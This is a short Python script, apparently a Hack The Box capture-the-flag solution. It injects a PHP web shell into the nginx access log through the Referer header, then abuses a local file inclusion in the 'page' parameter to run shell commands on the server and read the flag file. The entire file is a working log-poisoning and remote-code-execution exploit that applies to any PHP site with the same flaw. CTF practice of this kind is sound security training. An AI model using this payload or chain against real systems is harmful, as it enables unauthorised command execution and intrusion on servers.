#!/usr/bin/python3
from requests import get
from sys import argv
from re import findall

url = argv[1]

headers = {"Host": f"{url}", "Referer":"<?php passthru($_GET['cmd']); ?>"}

get(f"http://{url}", headers = headers)

#! to get the file name containing the flag
r = get(f"http://{url}" + "?page=/var/log/nginx/access.log&cmd=ls /")

#print(r.text)
#! getting the flag filename
flag_name = findall("flag.*", r.text)[0]

#print(flag_name)
#! getting the flag content
r = get(f"http://{url}" + f"?page=/var/log/nginx/access.log&cmd=cat /{flag_name}")

print(findall("HTB{.*", r.text)[0].split('"')[0])
